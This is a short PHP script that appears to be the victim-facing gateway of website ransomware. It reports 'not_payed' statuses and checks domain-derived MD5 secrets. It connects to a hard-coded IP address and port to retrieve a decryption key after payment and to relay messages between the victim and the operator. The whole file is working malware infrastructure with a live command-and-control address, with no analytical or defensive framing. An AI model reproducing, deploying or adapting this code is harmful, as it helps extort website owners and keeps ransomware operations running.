 <?php
header("Access-Control-Allow-Origin: *");
$debug = false;
if (!isset($_POST["domain"])) exit(json_encode(array("status" => "not_payed")));

function secret_ok() {
    $secret = substr(md5($_POST["domain"]), 8, 8);
    if (!isset($_POST["secret"]) || strpos($_POST["secret"], $secret) === false) {
        exit(json_encode(array("status" => "incorrect secret")));
    }
    return true;
}

$dectest = md5("jnvsbkjsd".substr(md5($_POST["domain"]), 16, 8)."3j3j3j3");
if (isset($_POST["decrypt"]) || 
    ((isset($_POST["sendmsg"]) || isset($_POST["recvmsg"])) && secret_ok())) {
    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($sock === false) {
        if ($debug) echo "socket_create(): ".socket_strerror(socket_last_error())."\n";
        exit();
    }

    $result = socket_connect($sock, "95.215.45.203", 9338);
    if ($result === false) {
        if ($debug) echo "socket_connect(): ($result) ".socket_strerror(socket_last_error($sock))."\n";
        exit();
    }
    
    if (isset($_POST["decrypt"])) {
        $req = "vic";
        socket_write($sock, $req, strlen($req));
        $req = str_pad($_POST["domain"], 128);
        socket_write($sock, $req, strlen($req));
        $resp = socket_read($sock, 64);
        if ($resp == "not_payed") {
            echo json_encode(array("status" => "not_payed"));
        } else {
            echo json_encode(array("status" => "success", "decrypt" => $resp,
                "dectest" => $dectest,
                "secret" => substr(md5("djf33".$_POST["domain"]), 2, 10)));
        }
    } elseif (isset($_POST["sendmsg"])) {
        $req = "snd";
        socket_write($sock, $req, strlen($req));
        $req = str_pad($_POST["domain"], 128);
        socket_write($sock, $req, strlen($req));
        $req = substr($_POST["msg"], 0, 2048);
        socket_write($sock, $req, strlen($req));
        echo json_encode(array("status" => "success"));
    } elseif (isset($_POST["recvmsg"])) {
        $req = "rcv";
        socket_write($sock, $req, strlen($req));
        $req = str_pad($_POST["domain"], 128);
        socket_write($sock, $req, strlen($req));
        $resp = socket_read($sock, 2048);
        echo json_encode(array("status" => "success", "answer" => $resp));
    }

    socket_close($sock);
} elseif (isset($_POST["dectest"]) && secret_ok()) {
    exit(json_encode(array(
        "status" => "success", "dectest" => $dectest,
        "secret" => substr(md5("djf33".$_POST["domain"]), 2, 10)))
    );
} ?>